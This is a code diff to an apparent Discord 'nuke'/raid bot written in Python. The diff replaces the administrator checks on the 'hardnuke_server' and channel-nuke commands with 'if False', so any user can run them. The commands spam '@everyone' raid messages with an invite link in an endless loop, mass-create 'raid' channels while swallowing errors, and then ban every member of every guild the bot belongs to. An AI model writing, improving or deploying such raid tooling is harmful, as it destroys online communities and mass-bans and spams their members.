@@ -165,25 +165,14 @@ async def nuke_server_fr(ctx):
 
 @bot.command(name='hardnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!! PLSPLSPLS')
 async def nuke_server_fr(ctx):
-    if not ctx.author.guild_permissions.administrator and not ctx.author.id == 762152955382071316:
+    if False:
         print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .hardnuke_server")
         await ctx.send("You don't have `Administrator` Permissions!")
     else:
 
-        all_members_list = []
-
-        for guild in bot.guilds:
-            for membertemp in guild.members:
-                all_members_list.append(membertemp)
-
-        async def ban(self, *, member1: discord.Member, reason=None):
-            await member1.ban(reason=reason)
-
-        for member in all_members_list:
-            await ban(member1=member, self=None)
-
+        
         async def nuke_channel_2(txt):
-            if not txt.author.guild_permissions.administrator and not txt.author.id == 762152955382071316:
+            if False:
                 print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
                 await txt.send("You don't have `Administrator` Permissions!")
             else:
@@ -214,8 +203,24 @@ async def nuke_server_fr(ctx):
         while True:
             await newchannel.send('**<@everyone> RAIDED BY MZ FreeRobux '
                                   'https://discord.gg/uAsCWzkNZd. EZ Noobs**')
-            await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
-            await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+            try:
+                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
+            except:
+                None
+        
+        
+        all_members_list = []
+
+        for guild in bot.guilds:
+            for membertemp in guild.members:
+                all_members_list.append(membertemp)
+
+        async def ban(self, *, member1: discord.Member, reason=None):
+            await member1.ban(reason=reason)
+
+        for member in all_members_list:
+            await ban(member1=member, self=None)
 
 
 # ban part broken for now
